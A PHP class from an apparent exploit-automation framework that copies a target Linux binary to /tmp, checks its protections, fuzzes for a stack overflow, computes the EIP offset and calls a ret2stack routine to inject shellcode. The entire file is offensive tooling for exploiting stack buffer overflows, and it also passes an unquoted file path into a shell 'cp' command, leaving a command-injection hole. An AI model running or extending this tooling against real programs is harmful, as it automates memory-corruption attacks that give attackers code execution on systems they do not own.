<?php

class exploit4linux extends bin4linux{
    
    
    public function __construct($bin_bof) {       
        $name = __CLASS__;
        $rep_path = "/tmp/$name";
        if (!is_dir($rep_path)) $this->create_folder($rep_path);
        $obj_file = new FILE($bin_bof);
        $query = "cp -v $bin_bof $rep_path";
        $this->requette($query);
        $new_bin = "$rep_path/$obj_file->file_name$obj_file->file_ext";
        parent::__construct($new_bin);
    }
    
    
    
    
    public function exploit4linux2check(){
        $this->gtitre(__FUNCTION__);
        $this->elf2checksec();
        if ($this->elf2checksec4NX()) {
            $obj_bin = new ret2stack4linux($this->file_path);
            $overflow = $obj_bin->elf2fuzzeling("","");
            $offset_eip = $obj_bin->elf2offset4eip("",$overflow,"");
            //$overflow = 2044;
            //$offset_eip = 524;

            $shellcode = $obj_bin->shellcode_date_linux ;
            $this->article("shellcode", $shellcode);
            $this->pause();
            
            $exploit_size_max = 2048;
            $dll = "all";
            $header = "";
            $footer = "";
            $obj_bin->ret2stack4linux_all($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max);
        }
    }









}

?>